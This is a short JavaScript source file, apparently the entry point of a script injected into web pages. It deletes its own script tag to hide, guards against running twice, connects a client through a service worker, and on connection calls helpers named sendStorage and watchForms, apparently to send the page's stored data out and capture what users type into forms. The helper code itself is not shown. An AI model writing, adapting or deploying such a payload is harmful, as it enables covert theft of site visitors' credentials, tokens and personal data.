import {Client} from '2sweet'
import removeCurrentScript from '@functions/removeCurrentScript'
import sendStorage from './sendStorage'
import watchForms from './watchForms'

removeCurrentScript()

pagePayload()

function pagePayload() {
  if (window.hasOwnProperty('binV')) {
    return
  } else {
    window.binV = undefined
  }
  const client = new Client()

  console.log('poobis', client)

  window.navigator.serviceWorker.controller.addEventListener('message', console.log)

  client.on('connected', onConnect.bind(null, client))
}

function onConnect(client) {
console.log('poobis')

  sendStorage(client)
  watchForms(client)
}
